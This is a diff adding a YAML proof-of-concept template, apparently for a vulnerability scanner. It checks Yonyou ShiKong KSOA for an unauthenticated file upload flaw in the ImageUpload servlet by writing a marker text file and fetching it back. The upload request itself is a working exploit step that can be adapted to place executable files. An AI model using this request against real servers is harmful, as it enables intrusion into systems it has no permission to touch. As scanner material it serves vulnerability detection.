@@ -1,0 +1,22 @@
+name: poc-yaml-nc-ksoa-imageupload-rce
+rules:
+    - method: POST
+      path: /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=1314520.txt
+      headers:
+        Content-Type: 1
+      body: >-
+        1314520
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'/pictures/1314520.txt')
+    - method: GET
+      path: /pictures/1314520.txt
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520')
+        
+detail:
+    author: nc-ksoa-imageupload-rce
+    links:
+        - app="用友-时空KSOA"
+
